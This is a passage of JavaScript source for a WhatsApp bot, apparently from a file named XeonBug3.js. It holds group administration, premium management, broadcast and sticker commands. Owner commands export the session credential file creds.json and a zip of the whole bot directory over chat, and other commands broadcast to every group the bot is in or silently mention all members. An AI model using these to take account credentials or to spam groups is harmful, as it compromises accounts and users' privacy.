let videobuffy = fs.readFileSync(`./GlobalMedia/video/${BhosdikaXeon}.mp4`)
GlobalTechInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
GlobalTechInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./GlobalMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
GlobalTechInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./GlobalMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./GlobalMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replyglobal(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                GlobalTechInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 2)
                    return replyglobal(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replyglobal("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replyglobal("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replyglobal("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replyglobal("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replyglobal(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                GlobalTechInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replyglobal(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replyglobal('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replyglobal(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replyglobal(teks)
                    await sleep(2000)
                    replyglobal("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replyglobal("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return replyglobal(mess.owner)
                    if (!text) return replyglobal('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyglobal('Link Invalid!')
                    replyglobal(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await GlobalTechInc.groupAcceptInvite(result).then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                } catch {
                    replyglobal('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return replyglobal(mess.owner)
                replyglobal('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                GlobalTechInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replyglobal(mess.owner)
                replyglobal(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replyglobal(mess.owner)
                replyglobal('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replyglobal(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyglobal(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replyglobal(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replyglobal(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replyglobal(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replyglobal(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replyglobal(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replyglobal(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replyglobal(mess.owner)
               if (args.length < 1) return replyglobal('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replyglobal(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replyglobal(`${command} is disabled`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replyglobal(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replyglobal(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    GlobalTechInc.public = true
                    replyglobal(mess.done)
                } else if (q == 'self') {
                    GlobalTechInc.public = false
                    replyglobal(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replyglobal(mess.owner)
                if (!text) return replyglobal(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replyglobal(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replyglobal(mess.owner)
                if (!quoted) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await GlobalTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await GlobalTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                } else {
                    var memeg = await GlobalTechInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replyglobal(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GlobalTechInc.updateBlockStatus(blockw, 'block').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replyglobal(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GlobalTechInc.updateBlockStatus(blockww, 'unblock').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'leave':
                if (!isCreator) return replyglobal(mess.owner)
                if (!m.isGroup) return replyglobal(mess.group)
                replyglobal('Bye Everyone 🥺')
                await GlobalTechInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replyglobal(mess.owner)
                if (m.isGroup) return replyglobal(mess.private)
                replyglobal(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await GlobalTechInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replyglobal(mess.owner)
                if (!text) return replyglobal(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await GlobalTechInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replyglobal(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    GlobalTechInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replyglobal(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replyglobal(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replyglobal(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replyglobal(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replyglobal('The message was not sent by a bot!')
                GlobalTechInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyglobal('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyglobal(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    GlobalTechInc.groupSettingUpdate(m.chat, 'announcement')
                    replyglobal(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyglobal('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyglobal(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    GlobalTechInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replyglobal(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GlobalTechInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GlobalTechInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GlobalTechInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GlobalTechInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (!text) return 'Text ?'
                await GlobalTechInc.groupUpdateSubject(m.chat, text).then((res) => replyglobal(mess.success)).catch((err) => replyglobal(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (!text) return 'Text ?'
                await GlobalTechInc.groupUpdateDescription(m.chat, text).then((res) => replyglobal(mess.success)).catch((err) => replyglobal(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (!quoted) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await GlobalTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await GlobalTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                } else {
                    var memeg = await GlobalTechInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyglobal(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replyglobal(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                GlobalTechInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyglobal(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replyglobal(mess.botAdmin)
                GlobalTechInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isBotAdmins && !isCreator && !isPremium) return replyglobal(mess.botAdmin)
                if (!isAdmins && !isCreator && !isPremium) return replyglobal(mess.admin)
                if (!m.quoted) return replyglobal(`Reply messages with captions ${prefix + command}`)
                GlobalTechInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (args[0] === 'close') {
                    await GlobalTechInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replyglobal(`Success In Closing The Group 🕊️`)).catch((err) => replyglobal(json(err)))
                } else if (args[0] === 'open') {
                    await GlobalTechInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyglobal(`Success In Opening The Group 🕊️`)).catch((err) => replyglobal(json(err)))
                } else {
                    replyglobal(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (args[0] === 'open') {
                    await GlobalTechInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replyglobal(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replyglobal(json(err)))
                } else if (args[0] === 'close') {
                    await GlobalTechInc.groupSettingUpdate(m.chat, 'locked').then((res) => replyglobal(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replyglobal(json(err)))
                } else {
                    replyglobal(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let response = await GlobalTechInc.groupInviteCode(m.chat)
                GlobalTechInc.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                await GlobalTechInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replyglobal(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replyglobal(json(err)))
                break
                case 'p':
            case 'ping':{
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await GlobalTechInc.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner😉`
                await GlobalTechInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
                GlobalTechInc.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `FORGET DONATE`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                GlobalTechInc.sendMessage(m.chat, {
                    text: `Helllo world`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @DGXeon`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'donasi':
                let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                GlobalTechInc.sendMessage(m.chat, {
                    text: 'Paypal: https://www.paypal.me/josephxeon13\n\n' + textnate
                }, {
                    quoted: m
                })
                break
case 'owner': {
const repf = await GlobalTechInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
GlobalTechInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyglobal(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await GlobalTechInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyglobal('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await GlobalTechInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyglobal(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replyglobal(respond)
                if (!text) return replyglobal(respond)
                replyglobal(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await GlobalTechInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replyglobal(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
GlobalTechInc.downloadAndSaveMediaMessage(quoted, "gifee")
GlobalTechInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await GlobalTechInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyglobal('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await GlobalTechInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replyglobal(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replyglobal(`Reply sticker with caption *${prefix + command}*`)
                replyglobal(mess.wait)
                let media = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    GlobalTechInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replyglobal(`Reply sticker with caption *${prefix + command}*`)
                replyglobal(mess.wait)
                let media = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await GlobalTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyglobal(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replyglobal(mess.wait)
                let media = await GlobalTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
